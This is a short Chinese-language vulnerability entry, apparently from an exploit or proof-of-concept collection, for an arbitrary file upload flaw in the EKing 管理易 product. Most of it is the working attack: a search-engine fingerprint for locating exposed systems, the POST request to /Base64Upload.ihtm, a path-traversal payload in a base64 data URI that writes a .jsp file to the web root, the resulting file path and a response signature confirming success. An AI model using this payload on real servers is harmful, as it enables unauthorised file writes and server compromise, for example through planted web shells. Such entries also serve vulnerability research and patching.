# EKing-管理易Base64Upload存在任意文件上传漏洞

EKing ｜ 文件上传 ｜ —
- **指纹**：`app="EKing-管理易"`
- **请求**：`POST /Base64Upload.ihtm HTTP/1.1`

**Payload**
```
base64_str=data:image//../../../111.jsp.;base64,MTIz
上传定位：/111.jsp
```
- **响应特征**：200 sName